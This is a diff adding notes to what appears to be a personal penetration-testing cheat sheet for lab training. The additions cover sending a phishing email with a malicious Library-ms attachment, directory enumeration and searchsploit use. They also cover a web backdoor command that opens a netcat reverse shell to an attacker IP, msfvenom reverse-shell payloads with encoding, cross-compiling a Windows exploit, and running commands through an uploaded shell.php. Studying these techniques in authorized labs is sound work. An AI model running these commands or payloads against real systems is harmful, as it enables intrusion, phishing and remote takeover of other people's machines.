@@ -953,4 +953,76 @@ folderType -> use Documents guid
 </libraryDescription>
 ```
 
+easy way to send email
 
+
+```
+sendemail -f test@supermagicorg.com -xu test@supermagicorg.com -xp test -t dave.wizard@supermagicorg.com -u please open -m hello -s 192.168.210.199 -a config.Library-ms
+```
+
+don't forget to search txt,pdf files in gobuster
+
+```
+gobuster dir -u http://192.168.210.199 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x pdf,txt
+```
+
+
+## Online Exploit Resources
+
+ExploitDb
+Packet Storm -- Security News + Exploits
+
+Metasploit
+Core Impact
+Canvas
+BeEF
+
+
+searchsploit update
+```
+sudo apt update && sudo apt install exploitdb
+```
+
+use -m flag with searchsploit to copy exploit into local dir
+```
+searchsploit -m windows/remote/48537.py
+# Or
+searchsploit -m 42031
+```
+
+use curl to url encode data and get reverse shell
+```
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
+curl http://192.168.194.11/project/uploads/users/830954-backdoor.php --data-urlencode cmd=nc -nv 192.168.45.235 6666 -e /bin/bash/
+```
+
+use nmap smb-share-enum script to get smb shares then smbclient to access
+```
+sudo nmap --script=smb-enum-shares 192.168.194.10
+smbclient //192.168.194.10/offsec -c dir Downloads/*
+```
+
+msfvenom to generate reverse shell payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4444 -f exe > windows_reverse_shell.exe
+```
+cross-compiling windows exploits on kali
+```
+sudo apt install mingw-w64
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+
+using msfvenom for reverse shell
+-f format
+-e encoding
+-b bad chars
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+```
+
+use -k command with curl to not verify certs
+```
+curl -k https://192.168.214.45/uploads/shell.php?cmd=whoami
+```
